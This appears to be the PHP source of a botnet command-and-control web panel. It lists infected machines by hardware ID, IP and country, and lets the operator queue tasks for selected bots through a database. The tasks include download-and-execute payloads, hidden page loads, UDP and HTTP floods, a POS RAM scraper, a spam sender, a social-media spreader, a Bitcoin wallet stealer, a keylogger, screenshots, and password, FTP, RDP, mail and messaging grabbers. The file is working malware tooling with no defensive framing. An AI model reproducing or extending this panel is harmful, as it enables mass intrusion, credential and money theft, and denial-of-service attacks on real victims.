<?php
session_start();

require_once('inc/functions.php');
banned();
require_once('inc/session.php');
require_once('inc/config.php');
require_once('inc/html_grund.php');
include('inc/cron.php');
include('inc/counts.php');
include("inc/ip_files/countries.php");

$query_1    = mysql_query("SELECT COUNT(*) FROM clients ");
$item_count = mysql_result($query_1, 0);
$query_1    = mysql_query("SELECT * FROM clients ORDER BY id DESC");
$query1rows = mysql_num_rows($query_1);
$query_2    = mysql_query("SELECT DISTINCT cc FROM clients");
$action = "window.open('inc/exec.php','targetWindow','toolbar=no,location=,status=no,menubar=no,scrollbars=no,resizable=no,width=780,height=350,left=180,top=180')";

if (isset($_GET['cd']))
  {
    mysql_query("DELETE FROM clients WHERE status LIKE 'Dead'");
  }

echo '
<script language="JavaScript">

function checkAll()
{
var boxes = document.getElementsByTagName("input");
for (var i = 0; i < boxes.length; i++) {
    if (boxes[i].name == "vote[]") {
        boxes[i].checked = true;
    }
}
}

function checkValue(contain) 
{

        var boxes = document.getElementsByTagName("input");
	for (var i = 0; i < boxes.length; i++) {
    	if (boxes[i].name == "vote[]") {
            if (boxes[i].value.indexOf(contain[0].value) != -1) {
            boxes[i].checked = true;
        }
    }
}
}

function uncheckAll()
{
var boxes = document.getElementsByTagName("input");
for (var i = 0; i < boxes.length; i++) {
    if (boxes[i].name == "vote[]") {
        boxes[i].checked = false;
    }
}
}

	</script>
	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
		
	<script type="text/javascript">
    	$(document).ready(function(){
      		refreshBotsOnline();
    	});
    	
    	function refreshBotsOnline(){
        	$(\'#nav\').load(\'inc/html_menu.php\');
        	setTimeout(refreshBotsOnline, 5000);
    	}
	</script>
	
	<link rel="stylesheet" type="text/css" href="css/stylex.css"/>
	<form action="?" method="post" name="form" id="form">
	<center>
        
        <SELECT name="task" id="task" onchange="" style="width:210px">
        
      <br>
      
     </center>
      
    <optgroup label="Remote File Execution:">
		<OPTION selected value="DL">Download & Execute (Memory)</OPTION>
		<OPTION value="DD">Download & Execute (Disk)</OPTION>
	</optgroup>
	
	<optgroup label="Web:">
		<OPTION value="VV">Open Webpage [Visible]</OPTION>
		<OPTION value="VH">Open Webpage [Hidden]</OPTION>
	</optgroup>';
	
	if (file_exists("plugins/ddos.p"))
	{
		echo '<optgroup label="DDoS:">
					<OPTION value="UD">UDP Flood</OPTION>
					<OPTION value="HT">HTTP Flood</OPTION>
			  </optgroup>';
	}
	
	echo '<optgroup label="Money:">
			  <OPTION value="AH">Activate / Deactivate Host</OPTION>';
		
		if (file_exists("plugins/POS.p"))
	{
		echo '<OPTION value="PS">Activate / Deactivate POS</OPTION>';
	}
	
		if (file_exists("plugins/spam.p"))
	{
		echo '<OPTION value="SP">Activate Spam Sender</OPTION>';
	}
	
		if (file_exists("plugins/homepage.p"))
	{
		echo '<OPTION value="HP">Firefox Homepage Changer</OPTION>';
	}

		if (file_exists("plugins/social.p"))
	{
		echo '<OPTION value="DS">FB/Twitter Message Spreader</OPTION>';
	}
		
	echo '<OPTION value="BS">Bitcoin Wallet Stealer</OPTION>
	</optgroup>
	
	<optgroup label="Surveillance:">
		<OPTION value="KY">Start / Stop Keylogger</OPTION>';
		
	if (file_exists("plugins/screenshot.p"))
	{
		echo '<OPTION value="TS">Take Screenshot</OPTION>';
	}
	
	echo' </optgroup> <optgroup label="Grabbers:">';
	
		if (file_exists("plugins/passwords.p"))
	{
		echo '<OPTION value="VI">Grab Passwords</OPTION>';
	}
	
	echo '<OPTION value="FZ">Grab FTP</OPTION>';

		if (file_exists("plugins/rdp.p"))
	{
		echo '<OPTION value="GR">Grab RDP</OPTION>';
	}
	
		if (file_exists("plugins/ins.p"))
	{
		echo '<OPTION value="GI">Grab instant messaging</OPTION>';
	}
	
		if (file_exists("plugins/mail.p"))
	{
		echo '<OPTION value="GE">Grab Mail</OPTION>';
	}
	
	echo '</optgroup>
	
	<optgroup label="Bot Options:">
		<OPTION value="UP">Update</OPTION>
		<OPTION value="UN">Uninstall</OPTION>
	</optgroup>
	</SELECT>
	
  <input type="text" id="url" name="url" style="width:310px"/>&nbsp<input type="submit" name="submitted" value="Send" class="btn" OnClick=""/>&nbsp&nbsp<a href="#" onclick="'.$action.'" title="Task Status"><img src="img/task.png" aling="bottom" height="16" wedth="16"></a>

  
	<br><input type="button" name="selectall" value="Select All" class="btn" OnClick="checkAll()" />&nbsp;<input type="button" name="country" value="Select by Country" class="btn" OnClick="uncheckAll(); checkValue(document.getElementsByName(\'countrylist\'));" />&nbsp;<input type="button" name="type" value="Select by Type" class="btn" OnClick="uncheckAll(); checkValue(document.getElementsByName(\'typelist\'));" />&nbsp;<input type="button" name="status" value="Select by Status" class="btn" OnClick="uncheckAll(); checkValue(document.getElementsByName(\'statuslist\'));" />&nbsp;<br>
	
	
	
	<input type="button" name="deselectall" value="Deselect All" class="btn" OnClick="uncheckAll()"/>
  
  
	<SELECT name="countrylist" id="countrylist" onchange="" style="width: 150px">';
while ($row = mysql_fetch_array($query_2))
  {
    $country_name = $countries[$row[0]][1];
    echo '<OPTION value=' . $row[0] . '>' . vcc($country_name) . '</OPTION>';
  }
echo '
	</SELECT>
	
	<SELECT name="typelist" id="typelist" onchange="" style="width: 150px">
		<OPTION selected value="Full">(' . $full . ') Full Bots</OPTION>
		<OPTION value="Lite">(' . $lite . ') Lite Bots</OPTION>
	</SELECT>
	
	<SELECT name="statuslist" id="statuslist" onchange="" style="width: 150px">
		<OPTION selected value="Online">(' . $online . ') Online</OPTION>
		<OPTION value="Offline">(' . $offline . ') Offline</OPTION>
	</SELECT>
	
	<br>
	<table width=100%>
		  <tr>
		    <th class="th" style="text-align: center;">HWID</th>
		    <th class="th" style="text-align: center;">IPv4</th>
		    <th class="th" style="text-align: center;">Keylogger</th>
		    <th class="th" style="text-align: center;">RAM Scraper</th>
		    <th class="th" style="text-align: center;">Redirects</th>
		    <th class="th" style="text-align: center;">Status</th>
		    <th class="th" style="text-align: center;">Select</th>
		  </tr>';

while ($row = mysql_fetch_array($query_1))
  {
    $count                   = $count++;
    $IPaddress               = $row['ip'];
    $two_letter_country_code = iptocountry($IPaddress);
    $country_name            = $countries[$two_letter_country_code][1];
    $cctolower               = strtolower($two_letter_country_code);
    $flagname                = "img/flags/" . $cctolower . ".gif";
    $file_to_check           = $flagname;
    
    $readable_date = date("j F Y, g:i a", $row['time']);
    
    
    echo '<tr>';
    
    echo '</td> <td class="td" style="text-align: center;">' . $row['hid'] . '</td>
    
				<td class="td" style="text-align: center;">';
    if (file_exists($file_to_check))
      {
        print "<img src=$file_to_check> ".$row['ip']."<br>";
      }
    else
      {
        print "<img src=img/flags/noflag.gif> ".$row['ip']."<br>";
      }
      
    if ($row['fw'] == 'Lite')
      {
        echo '<td class="td" style="text-align: center;"><img src="img/delete-icon.png"></td>';
      }
    else
      {
      if ($row['ky'] == 'ON')
      	{
          echo '<td class="td" style="text-align: center;"><img src="img/on.ico"></td>';
      	}
      else
      	{
          echo '<td class="td" style="text-align: center;"><img src="img/off.ico"></td>';
        }
      }
      
    if ($row['fw'] == 'Lite')
      {
        echo '<td class="td" style="text-align: center;"><img src="img/delete-icon.png"></td>';
      }
    else
      {
       if ($row['pos'] == 'ON')
         {
           echo '<td class="td" style="text-align: center;"><img src="img/on.ico"></td>';
         }
       else
         {
          echo '<td class="td" style="text-align: center;"><img src="img/off.ico"></td>';
         }
      }
    if ($row['fw'] == 'Lite')
      {
        echo '<td class="td" style="text-align: center;"><img src="img/delete-icon.png"></td>';
      }
    else
      {
       if ($row['hst'] == 'ON')
         {
           echo '<td class="td" style="text-align: center;"><img src="img/on.ico"></td>';
         }
       else
         {
           echo '<td class="td" style="text-align: center;"><img src="img/off.ico"></td>';
         }
      }
    if ($row['status'] == 'Online')
      {
        echo '<td class="td" style="text-align: center; color: green;">' . $row['status'] . '</td>';
      }
    if ($row['status'] == 'Offline')
      {
        echo '<td class="td" style="text-align: center; color: red;">' . $row['status'] . '</td>';
      }
    if ($row['status'] == 'Dead')
      {
        echo '<td class="td" style="text-align: center;">' . $row['status'] . '</td>';
      }
    echo '<td class="td" style="text-align: center;"><input type="checkbox" name="vote[]" value="' . $row['id'] . ':' . $row['hid'] . ':'. $two_letter_country_code . ':' . $row['status'] .  ':' . $row['fw'] . '|" /></td>
						  </tr>';
  }
echo '</form></table>';
require_once('inc/html_footer.php');


if (isset($_POST['submitted']))
  {
    
    $countvote  = cleanstring(count($_POST['vote']));
    $task       = cleanstring($_POST['task']);
    $tasklength = strlen($task);
    $url        = cleanstring($_POST['url']);
    $urllength  = strlen($url);
    
    if ($countvote == 0)
      {
        echo "
 
   <script type='text/javascript'>
 
       alert('No clients selected.');
 
   </script>";
   
      }
    else
      {
        
        foreach ($_POST['vote'] as $vote)
          {
            $votesplit = explode(":", $vote);
            $botid     = $votesplit['0'];
	    $hwid      = $votesplit['1'];
            mysql_query("DELETE FROM commands WHERE viewed LIKE 1");
            mysql_query("INSERT INTO commands (id, hwid, botid, cmd, variable, viewed) VALUES ('', '$hwid', '$botid', '$task', '$url', '0')");
          }
      }
    
  }


?>